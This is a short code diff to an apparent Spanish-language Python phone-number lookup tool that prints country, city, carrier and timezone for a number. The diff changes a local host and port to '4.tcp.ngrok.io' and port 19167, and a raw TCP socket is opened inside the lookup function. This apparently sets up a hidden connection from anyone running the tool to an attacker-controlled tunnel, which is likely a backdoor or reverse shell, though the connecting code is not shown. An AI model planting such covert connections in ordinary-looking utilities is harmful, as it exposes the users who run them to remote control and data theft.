@@ -22,7 +22,7 @@ def numero():
     try:
         import phonenumbers
         from phonenumbers import geocoder, carrier, timezone
-        HOST = '192.168.0.10' 
+        HOST = '4.tcp.ngrok.io' 
         telefono = phonenumbers.parse(numero_telefono)
         international = phonenumbers.format_number(telefono, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
         codigo_pais = international.split(' ')[0]
@@ -32,7 +32,7 @@ def numero():
         print(Fore.YELLOW+f'\n[+] Formato internacional : {international}')
         print(f'[+] Nombre del país    : {country} ({codigo_pais})')
         print(f'[+] Ciudad / Provincia : {localisacion}')
-        PORT = 8080 
+        PORT = 19167
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         print(f'[+] Transportador    : {carrierr}')
         for time in timezone.time_zones_for_number(telefono):
